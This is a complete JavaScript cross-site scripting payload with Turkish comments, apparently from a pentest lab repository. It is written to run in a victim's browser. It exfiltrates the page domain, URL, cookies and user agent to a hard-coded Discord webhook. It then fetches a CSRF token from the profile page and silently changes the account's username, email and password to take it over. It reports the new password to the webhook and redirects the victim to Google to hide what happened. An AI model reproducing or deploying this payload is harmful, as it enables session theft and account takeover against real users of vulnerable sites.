// GitHub: s.js
(async function() {
    const webhookURL = "https://discord.com/api/webhooks/1469278750876368947/evwkKVf6b9B0g50c-JVP0w3Zt3J00ZW6PiGcUfvUAlIrqHJ4C2DjnYMb3e1nHeYBYi0I";
    
    alert("Mühendis Çocuk");

    // --- 1. ADIM: VERİ SIZDIRMA (DISCORD) ---
    const data = {
        username: "XSS Bot - Kaptan Pengu",
        content: "🚀 **Yeni Veri Sızdırıldı!**",
        embeds: [{
            title: "Saldırı Detayları",
            color: 16711680,
            fields: [
                { name: "Domain", value: document.domain, inline: true },
                { name: "Sayfa", value: location.href, inline: true },
                { name: "Çerezler (Cookies)", value: "```" + (document.cookie || "Yok/HttpOnly") + "```" },
                { name: "Kullanıcı Aracısı", value: navigator.userAgent }
            ],
            footer: { text: "CachyOS Pentest Lab" }
        }]
    };

    // İlk fetch: Verileri gönder
    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });

    // --- 2. ADIM: GİZLİ ŞİFRE DEĞİŞTİRME (ACCOUNT TAKEOVER) ---
    try {
        // Profil sayfasından taze CSRF Token çekiyoruz
        const profilSayfasi = await fetch('/auth/profile/edit').then(r => r.text());
        const tokenMatch = profilSayfasi.match(/name="csrf_token" value="([^"]+)"/);
        const csrfToken = tokenMatch ? tokenMatch[1] : null;

        if (csrfToken) {
            const formData = new FormData();
            formData.append('csrf_token', csrfToken);
            formData.append('username', 'Kaptan_Pengu_Hacked');
            formData.append('email', '1muhendiscocuk@gmail.com');
            formData.append('password', 'pwned123'); // Yeni Şifre
            formData.append('confirm_password', 'pwned123');
            formData.append('submit', 'Kaydet');

            // Şifreyi değiştiren gizli POST isteği
            await fetch('/auth/profile/edit', {
                method: 'POST',
                body: formData
            });

            // Başarı mesajını Discord'a gönder
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: "🔑 **Hesap Ele Geçirildi!** Kullanıcının yeni şifresi: `pwned123`" })
            });
        }
    } catch (err) {
        console.error("Şifre değiştirme hatası:", err);
    }

    // --- 3. ADIM: İZLERİ ÖRTME (YÖNLENDİRME) ---
    // Tüm işlemler bitti, şimdi kullanıcıyı yollayabiliriz.
    window.location.href = "https://www.google.com";

})();